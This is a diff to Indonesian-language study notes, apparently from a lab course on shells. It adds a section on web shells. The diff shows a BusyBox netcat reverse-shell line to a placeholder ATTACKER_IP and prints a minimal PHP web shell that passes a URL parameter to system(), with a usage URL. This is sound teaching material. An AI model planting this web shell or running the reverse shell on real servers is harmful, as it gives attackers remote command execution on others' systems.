@@ -452,3 +452,33 @@ busybox nc ATTACKER_IP 443 -e sh
 - `-e sh`: Execute shell setelah konek (fitur yang sering ilang di Netcat biasa, tapi ada di versi BusyBox).
 
 ## Task 7: Web Shells
+
+**Web shell** itu script jahat yang ditulis pake bahasa pemrograman web (kayak PHP, ASP, JSP) yang diem-diem ditanam di web server korban. Tujuannya? Biar attacker bisa jalanin perintah sistem langsung lewat browser
+
+Biasanya web shell ini disusupin lewat celah keamanan kayak **File Upload** (upload foto tapi isinya script), **RCE**, atau **LFI**.
+
+### Example PHP Web Shell
+
+Ini contoh web shell PHP yang paling simpel tapi mematikan:
+
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+**Penjelasan Code:**
+
+- `$_GET['cmd']`: Script ini bakal nunggu input parameter bernama `cmd` dari URL (method GET).
+- `system(...)`: Fungsi ini bakal ngejalanin apapun isi dari `cmd` sebagai perintah sistem.
+
+**Cara Pakainya:**
+Kalau script ini disimpan dengan nama `shell.php` di web server, attacker tinggal buka URL kayak gini:
+
+```url
+http://target.com/shell.php?cmd=whoami
+```
+
+Browser bakal nampilin hasil command `whoami` (misal: `www-data`). Cuma modal browser bisa ngontrol server
